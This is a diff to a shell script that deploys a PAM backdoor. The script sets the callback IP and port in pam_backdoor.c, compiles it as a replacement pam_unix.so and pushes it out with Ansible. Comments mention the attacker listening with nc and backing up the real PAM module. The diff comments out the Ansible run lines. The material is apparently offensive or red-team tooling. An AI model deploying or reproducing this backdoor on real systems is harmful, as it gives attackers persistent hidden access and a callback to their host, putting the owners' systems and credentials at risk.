@@ -29,7 +29,7 @@ sed -i "s/^ansible_password.*/ansible_password=$pass/" ./inventory.ini
 sed -i "s/^ansible_become_password.*/ansible_become_password=$pass/" ./inventory.ini
 
 # Install prereqs using ansible
-ansible-playbook main.yml -t initial
+# ansible-playbook main.yml -t local
 
 # Change pam_backdoor.c to match callback IP and Port
 sed -i "s/^#define CALLBACK_IP.*/#define CALLBACK_IP \"$ip\"/" ./pam_backdoor.c
@@ -43,21 +43,9 @@ sed -i "s/^#define CALLBACK_PORT.*/#define CALLBACK_PORT $port/" ./pam_backdoor.
 gcc -fPIC -shared -o pam_unix.so pam_backdoor.c -lpam -ldl
 
 # Run ansible playbook to setup
-ansible-playbook main.yml -t install
+# ansible-playbook main.yml -t 
 
 # attacker runs nc -nlvk <port>
-
-# get OS version
-# os_version=$(cat /etc/*-release | grep "PRETTY_NAME" | sed 's/PRETTY_NAME=//g')
-# version_number=0
-
-# if [[ $os_version == *"Ubuntu"* ]]; then
-#     version_number=1
-# fi
-
-# if [[ $os_version == *"Rocky"* || $os_version == *"Fedora"* ]]; then
-#     version_number=2
-# fi
 
 # # Backup old pam_unix.so
 # cp /lib/x86_64-linux-gnu/security/pam_unix.so /lib/pam.d/pam_unix.so
